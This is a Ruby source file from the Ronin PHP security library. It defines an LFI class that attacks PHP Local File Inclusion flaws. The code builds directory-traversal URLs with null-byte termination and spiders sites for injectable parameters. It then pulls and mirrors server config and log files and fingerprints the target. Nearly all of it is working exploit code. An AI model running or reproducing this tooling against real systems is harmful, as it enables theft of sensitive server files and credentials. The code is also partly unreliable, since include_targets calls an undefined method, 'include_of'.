#
# Ronin PHP - A Ruby library for Ronin that provides support for PHP
# related security tasks.
#
# Copyright (c) 2007-2009 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#

require 'ronin/php/lfi/exceptions/unknown_target'
require 'ronin/php/lfi/target'
require 'ronin/php/lfi/targets'
require 'ronin/php/lfi/file'
require 'ronin/extensions/uri'
require 'ronin/network/http'
require 'ronin/web/spider'
require 'ronin/path'

module Ronin
  module PHP
    class LFI

      # Maximum number of directories to escape
      MAX_UP = 15

      # The URL which is vulnerable
      attr_reader :url

      # The vulnerable query param
      attr_accessor :param

      # The path prefix
      attr_accessor :prefix

      # Number of directories to traverse up
      attr_accessor :up

      # Whether to terminate the LFI path with a null byte
      attr_accessor :terminate

      # Targeted Operating System (OS)
      attr_accessor :os

      #
      # Creates a new LFI object with the specified _url_, _param_ and the
      # given _options_. The specified _param_ indicates which query param
      # in the _url_ is vulnerable to Local File Inclusion.
      #
      # _options_ may contain the following keys:
      # <tt>:prefix</tt>:: The path prefix.
      # <tt>:up</tt>:: The number of directories to transverse up. Defaults
      #                to 0.
      # <tt>:terminate</tt>:: Whether or not to terminate the LFI path with
      #                       a null byte. Defaults to +true+.
      # <tt>:os</tt>:: The Operating System to target.
      #
      def initialize(url,param,options={})
        @url = url
        @param = param

        @prefix = options[:prefix]
        @up = (options[:up] || 0)

        if options.has_key?(:terminate)
          @terminate = options[:terminate]
        else
          @terminate = true
        end

        @os = options[:os]
      end

      def LFI.spider(url,options={},&block)
        lfis = []

        Web::Spider.site(url,options) do |spider|
          spider.every_url_like(/\?[a-zA-Z0-9_]/) do |vuln_url|
            found = vuln_url.test_lfi

            found.each(&block) if block
            lfis += found
          end
        end

        return lfis
      end

      #
      # Returns +true+ if the LFI path will be terminated with a null byte,
      # returns +false+ otherwise.
      #
      def terminate?
        @terminate == true
      end

      #
      # Builds a LFI url to include the specified _path_.
      #
      def url_for(path)
        escape = (@prefix || Path.up(@up))
        full_path = escape.join(path.to_s)
        full_path = "#{full_path}\0" if terminate?

        new_url = URI(@url.to_s)
        new_url.query_params[@param.to_s] = full_path

        return new_url
      end

      #
      # Get the specified _path_ with the given _options_.
      #
      def get(path,options={})
        options = options.merge(:url => url_for(path))

        if options[:method] == :post
          return Net.http_post_body(options)
        else
          return Net.http_get_body(options)
        end
      end

      #
      # Include the specified _path_ with the given _options_. Returns a
      # new File object for the included _path_.
      #
      def include(path,options={})
        File.new(path,get(path,options))
      end

      #
      # Include a targeted file specified by _name_ using the given
      # _options_. Returns a new File object for the included file.
      # If a _block_ is given, it will be passed the newly created File
      # object.
      #
      def include_target(name,options={},&block)
        name = name.to_s
        target = Target.with_file(name)

        unless target
          raise(UnknownTarget,"unknown target file #{name.dump}",caller)
        end

        return inclusion_of(target,options,&block)
      end

      def save_target(name,dest,options={})
        include_target(name,options) do |file|
          file.save(dest)
        end
      end

      #
      # Includes all targeted config and log files with the given _options_.
      #
      def include_targets(options={},&block)
        (Target.configs + Target.logs).map { |target|
          include_of(target,options,&block)
        }.compact
      end

      #
      # Mirrors all targeted config and log files to the specifed
      # _directory_ using the given _options_.
      #
      def mirror_targets(directory,options={})
        include_targets(options).map do |file|
          file.mirror(directory)
        end
      end

      #
      # Returns +true+ if the url is vulnerable to LFI, returns +false+
      # otherwise.
      #
      def vulnerable?(options={})
        Target.tests.each do |target|
          inclusion_of(target) do |file|
            return true
          end
        end

        return false
      end

      #
      # Extracts information from all targeted files using the given
      # _options_.
      #
      # _options_ may include the following options:
      # <tt>:oses</tt>:: The Array of OSes to test for.
      #
      def fingerprint(options={})
        data = {}

        Target.with_extractors.each do |target|
          inclusion_of(target,options) do |file|
            data.merge!(target.extract_from(file.contents))
          end
        end

        return data
      end

      #
      # Returns the String form of the url.
      #
      def to_s
        @url.to_s
      end

      protected

      #
      # Returns the available paths of the specified _target_.
      #
      def paths_of(target)
        if @os
          return target.paths_for(@os)
        else
          return target.all_paths
        end
      end

      #
      # Returns the File object obtained via the specified _target_
      # and the given _options_. If a _block_ is given, it will be passed
      # the new File object.
      #
      def inclusion_of(target,options={},&block)
        paths_of(target).each do |path|
          body = get(path,options)

          if target.included_in?(body)
            file = File.new(path,body)

            block.call(file) if block
            return file
          end
        end

        return nil
      end

    end
  end
end
